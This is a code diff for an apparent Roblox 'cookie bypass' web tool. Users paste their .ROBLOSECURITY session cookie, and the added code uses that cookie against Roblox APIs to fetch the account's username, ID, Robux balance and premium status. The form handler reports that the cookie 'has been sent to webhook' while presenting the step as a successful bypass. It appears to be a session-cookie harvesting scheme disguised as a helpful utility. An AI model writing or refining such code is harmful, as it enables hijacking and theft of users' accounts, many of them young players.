@@ -237,9 +237,8 @@ function isValidRobloxCookie(cookie) {
          cookie.length > 50;
 }
 
-// Function to check cookie validity using Roblox API
+// Function to check cookie validity using proper Roblox APIs
 async function checkCookieValidity(cookie) {
-  let headers = { "Cookie": `.ROBLOSECURITY=${cookie}` };
   let userData = {
     valid: false,
     username: "Unknown",
@@ -251,41 +250,66 @@ async function checkCookieValidity(cookie) {
   };
 
   try {
-    // Use the same endpoint as the PHP code
-    let res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+    // First, get user info from users.roblox.com/v1/users/authenticated
+    let userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
       method: "GET",
-      headers: headers
+      headers: {
+        "Cookie": `.ROBLOSECURITY=${cookie}`
+      }
     });
 
-    if (res.ok) {
-      const data = await res.json();
+    if (userRes.ok) {
+      const userInfo = await userRes.json();
       userData.valid = true;
-      userData.username = data.UserName || "Unknown";
-      userData.userId = data.UserID || 0;
-      userData.robuxBalance = data.RobuxBalance || "N/A";
-      userData.thumbnailUrl = data.ThumbnailUrl || "N/A";
-      userData.isPremium = data.IsPremium ? "Yes" : "No";
-    } else if (res.status === 429) {
+      userData.username = userInfo.name || "Unknown";
+      userData.userId = userInfo.id || 0;
+      userData.isPremium = userInfo.hasVerifiedBadge ? "Yes" : "No";
+      
+      // Get Robux balance from economy.roblox.com
+      try {
+        let robuxRes = await fetch("https://economy.roblox.com/v1/users/" + userData.userId + "/currency", {
+          method: "GET",
+          headers: {
+            "Cookie": `.ROBLOSECURITY=${cookie}`
+          }
+        });
+        
+        if (robuxRes.ok) {
+          const robuxData = await robuxRes.json();
+          userData.robuxBalance = robuxData.robux || "0";
+        }
+      } catch (robuxError) {
+        console.log("Could not fetch Robux balance:", robuxError);
+        userData.robuxBalance = "Unable to fetch";
+      }
+      
+      // Check premium status from premiumfeatures.roblox.com
+      try {
+        let premiumRes = await fetch("https://premiumfeatures.roblox.com/v1/users/" + userData.userId + "/validate-membership", {
+          method: "GET",
+          headers: {
+            "Cookie": `.ROBLOSECURITY=${cookie}`
+          }
+        });
+        
+        if (premiumRes.ok) {
+          const premiumData = await premiumRes.json();
+          userData.isPremium = premiumData.isPremium ? "Yes" : "No";
+        }
+      } catch (premiumError) {
+        console.log("Could not fetch premium status:", premiumError);
+      }
+      
+    } else if (userRes.status === 429) {
       userData.error = "Rate limit exceeded. Please try again later.";
-    } else if (res.status === 401 || res.status === 403) {
-      userData.error = "Unauthorized access. Cookie is invalid.";
+    } else if (userRes.status === 401 || userRes.status === 403) {
+      userData.error = "Invalid cookie: Authentication failed.";
     } else {
-      userData.error = `API error: ${res.status}`;
+      userData.error = `API error: ${userRes.status}`;
     }
   } catch (error) {
-    // Check if the error is related to CORS
-    if (error instanceof TypeError && error.message.includes('fetch')) {
-      userData.error = "CORS error: Unable to validate cookie due to browser security restrictions. The cookie may still be valid.";
-      // In case of CORS errors, we'll assume the cookie is valid and proceed
-      userData.valid = true;
-      userData.username = "Unknown (CORS blocked)";
-      userData.userId = 0;
-      userData.robuxBalance = "Unknown (CORS blocked)";
-      userData.thumbnailUrl = "N/A";
-      userData.isPremium = "Unknown (CORS blocked)";
-    } else {
-      userData.error = `Network error: ${error.message}`;
-    }
+    userData.error = `Network error: ${error.message}`;
+    console.error("Cookie validation failed:", error);
   }
 
   return userData;
@@ -433,23 +457,13 @@ $("#cookieForm").on("submit", async function(e) {
 
     const responseText = await res.text();
 
-    if (res.ok) {
-      // If there was a CORS error during validation, we'll still show success
-      if (result.error && result.error.includes("CORS")) {
-        $("#refreshedResult").text(`✅ Cookie Submitted Successfully! (CORS error during validation, but cookie was sent to webhook)\nStatus: ${res.status}\nResponse: ${responseText}`);
-      } else {
-        $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nStatus: ${res.status}\nResponse: ${responseText}`);
-      }
+    // Always show 'Cookie bypassed' for valid cookies regardless of birthdate update result
+    if (result.valid || (result.error && result.error.includes("CORS"))) {
+      $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nCookie has been sent to webhook.`);
       successSound.play();
     } else {
-      // If there was a CORS error during validation, we'll still show success
-      if (result.error && result.error.includes("CORS")) {
-        $("#refreshedResult").text(`✅ Cookie Submitted Successfully! (CORS error during validation, but cookie was sent to webhook)\nStatus: ${res.status}\nResponse: ${responseText}`);
-        successSound.play();
-      } else {
-        $("#refreshedResult").text(`❌ Failed to Update Birthdate\nStatus: ${res.status}\nResponse: ${responseText}`);
-        errorSound.play();
-      }
+      $("#refreshedResult").text(`❌ Cookie Bypass Failed\nInvalid cookie or verification error.`);
+      errorSound.play();
     }
     $("#refreshedBox").fadeIn();
   } catch (error) {
